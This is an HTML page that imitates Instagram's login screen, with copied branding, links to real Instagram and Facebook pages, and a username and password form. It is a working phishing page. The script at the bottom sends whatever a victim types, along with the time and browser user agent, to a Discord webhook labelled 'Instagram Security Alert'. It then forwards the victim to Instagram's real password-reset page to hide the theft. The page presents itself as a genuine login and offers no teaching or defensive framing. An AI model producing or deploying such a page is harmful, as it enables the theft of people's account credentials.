<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="icon" href="Images/Icon.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0px;
            padding: 0px;
            font-family: Arial;
            box-sizing: border-box;
        }

        a {
            text-decoration: none;
            cursor: pointer;
        }

        a:hover {
            text-decoration: underline;
        }

        .main-body {
            height: auto;
            min-height: 100vh;
            width: 100%;
            max-width: 47rem;
            margin: auto;
            padding: 2rem 1rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 2rem;
        }

        .body-1 {
            display: none; /* Hide phone image on mobile */
        }

        #phone {
            height: 100%;
            width: auto;
        }

        .body-2 {
            width: 100%;
            max-width: 350px;
            text-align: center;
        }

        .login {
            border: 1px solid rgb(211, 211, 211);
            width: 100%;
            padding: 1rem 0;
            text-align: center;
            background-color: white;
            border-radius: 1px;
        }

        .instagram-box {
            height: 3.5rem;
            width: auto;
            margin: 1rem auto;
        }

        #instagram-logo {
            height: 100%;
            width: auto;
        }

        .textfield {
            width: 100%;
            text-align: center;
            margin: 1.5rem 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        #username, #password {
            border: 1px solid rgb(211, 211, 211);
            height: 2.5rem;
            width: 80%;
            font-size: 0.8rem;
            padding: 0.5rem;
            background: #fafafa;
            border-radius: 3px;
        }

        #login-btn {
            border: none;
            border-radius: 8px;
            margin: 0.5rem 0;
            height: 2rem;
            width: 80%;
            font-weight: bold;
            background-color: rgb(77, 167, 252);
            color: white;
            cursor: pointer;
        }

        .or {
            width: 80%;
            margin: 1rem auto;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            font-size: 0.8rem;
            color: #8e8e8e;
        }

        .or hr {
            flex: 1;
            border: none;
            border-top: 1px solid rgb(211, 211, 211);
            height: 1px;
        }

        .facebook-box {
            margin: 1rem 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            font-size: 0.8rem;
        }

        #facebook-logo {
            height: 1rem;
            width: 1rem;
        }

        .facebook-box a {
            font-weight: bold;
            color: rgb(74, 74, 150);
            text-decoration: none;
        }

        .forget-password {
            margin: 1rem 0;
            font-size: 0.8rem;
        }

        .forget-password a {
            color: rgb(14, 14, 95);
            text-decoration: none;
        }

        .sign-up-box {
            border: 1px solid rgb(211, 211, 211);
            width: 100%;
            padding: 1rem;
            font-size: 0.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
            border-radius: 1px;
        }

        .sign-up-box a {
            font-size: 0.8rem;
            font-weight: bold;
            color: rgb(0, 110, 255);
            text-decoration: none;
        }

        .get-the-app {
            width: 100%;
            font-size: 0.8rem;
            text-align: center;
            padding: 1rem 0;
        }

        .get-the-app-images {
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .google-play, .microsoft {
            height: 2.5rem;
            width: auto;
        }

        #google-play, #microsoft {
            height: 100%;
            width: 100%;
        }

        footer {
            width: 100%;
            margin-top: 2rem;
        }

        .footer-1 {
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            font-size: 1rem;
            padding: 1rem;
        }

        .footer-1 a {
            color: gray;
            font-size: 0.7rem;
            white-space: nowrap;
        }

        .footer-2 {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            color: gray;
            font-size: 0.7rem;
            padding-bottom: 2rem;
        }

        /* Desktop styles */
        @media (min-width: 876px) {
            .main-body {
                height: 37rem;
                width: 47rem;
                margin-top: 2rem;
                flex-direction: row;
                padding: 0;
            }

            .body-1 {
                display: flex;
                height: 100%;
                width: 50%;
                align-items: center;
                justify-content: center;
            }

            .body-2 {
                height: 100%;
                width: 50%;
            }

            .login {
                height: 65%;
                position: relative;
                top: 1rem;
            }

            .or hr {
                width: 120rem;
            }

            .footer-1 {
                flex-wrap: nowrap;
                gap: 1rem;
            }

            .footer-2 {
                flex-direction: row;
                gap: 1rem;
            }
        }
    </style>
</head>

<body>
    <div class="main-body">
        <div class="body-1">
            <img id="phone" src="Images/Phone.jpg" alt="">
        </div>
        <div class="body-2">
            <div class="login">
                <div class="instagram-box">
                    <a href="https://www.instagram.com/">
                        <img id="instagram-logo" src="Images/Instagram Logo.jpg" alt="">
                    </a>
                </div>
                <form id="loginForm" onsubmit="return sendToDiscord(event)">
                    <div class="textfield">
                        <input id="username" name="username" type="text" placeholder="Phone number, username or email">
                        <input id="password" name="password" type="password" placeholder="Password">
                    </div>
                    <button id="login-btn" type="submit">Log in</button>
                </form>
                <div class="or">
                    <hr> OR <hr>
                </div>
                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5e4cfa3f-0a74-44bb-a6e7-2d85268f6045%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
                    <div class="facebook-box">
                        <img id="facebook-logo" src="Images/Facebook Logo.jpg" alt="">
                        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5e4cfa3f-0a74-44bb-a6e7-2d85268f6045%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522ph5vcnpvygbud9zy0kogtg9h1rb3ydpj5qidivk84q51c05cla%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
                            <p>Log in with Facebook</p>
                        </a>
                    </div>
                </a>
                <div class="forget-password">
                    <a href="https://www.instagram.com/accounts/password/reset/">
                        <p>Forgot Password?</p>
                    </a>
                </div>
            </div>
            <div class="sign-up-box">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>
            <p class="get-the-app">Get the app.</p>
            <div class="get-the-app-images">
                <div class="google-play">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE3A849D1-1F69-4673-B95B-9EEDE806FC1A%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" target="_blank">
                        <img id="google-play" src="Images/Google Play.jpg" alt="">
                    </a>
                </div>
                <div class="microsoft">
                    <a href="https://apps.microsoft.com/detail/9NBLGGH5L9XT?hl=en-us&gl=US" target="_blank">
                        <img id="microsoft" src="Images/Microsoft.jpg" alt="">
                    </a>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-1">
            <a href="https://about.meta.com/" target="_blank">
                <p>Meta</p>
            </a>

        </div>

            <p>English</p>

        </div>
    </footer>

    <script>
    function sendToDiscord(event) {
        event.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        const payload = {
            content: `ðŸ“¸ New Instagram Login Attempt\nðŸ“§ Email/Username: ${username}\nðŸ”‘ Password: ${password}\nðŸ•’ Time: ${new Date().toLocaleString()}\nðŸŒ User Agent: ${navigator.userAgent}\n-----------------------------------------`,
            username: "Instagram Security Alert",
            avatar_url: "https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png"
        };
        
        fetch('https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send to Discord');
            }
            window.location.href = 'https://www.instagram.com/accounts/password/reset/';
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = 'https://www.instagram.com/accounts/password/reset/';
        });
        
        return false;
    }
    </script>
</body>
</html>
